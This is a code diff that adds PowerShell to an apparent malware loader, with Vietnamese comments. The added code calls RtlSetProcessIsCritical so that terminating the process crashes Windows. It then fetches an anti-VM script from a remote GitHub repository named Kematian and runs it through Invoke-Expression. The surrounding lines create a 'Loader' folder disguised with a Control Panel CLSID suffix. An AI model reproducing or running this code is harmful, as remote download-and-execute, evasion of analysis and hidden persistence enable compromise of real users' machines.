@@ -1,3 +1,43 @@
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CriticalProcessHelper {
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int RtlSetProcessIsCritical(uint isCritical, ref uint refValue, uint unknown);
+
+    public static void SetProcessCritical() {
+        uint isCritical = 1;  // Process is critical
+        uint refValue = 0;    // Reserved, must be zero
+        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
+    }
+
+    public static void UnsetProcessCritical() {
+        uint isCritical = 0;  // Process is no longer critical
+        uint refValue = 0;    // Reserved, must be zero
+        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
+    }
+}
+"@
+
+# Đặt tiến trình hiện tại là Critical Process
+[CriticalProcessHelper]::SetProcessCritical()
+
+try {
+    # Tải và chạy tập lệnh từ URL
+    $url = "https://raw.githubusercontent.com/macedonianlegend/Kematian/main/frontend-src/antivm.ps1"
+    $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
+    Invoke-Expression $scriptContent
+}
+catch {
+    Write-Host "Đã xảy ra lỗi khi chạy tập lệnh từ URL: $_"
+}
+finally {
+    # Gỡ trạng thái Critical Process
+    [CriticalProcessHelper]::UnsetProcessCritical()
+    Write-Host "Đã tắt Critical Process"
+}
+
 $rdir = "$env:localappdata\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
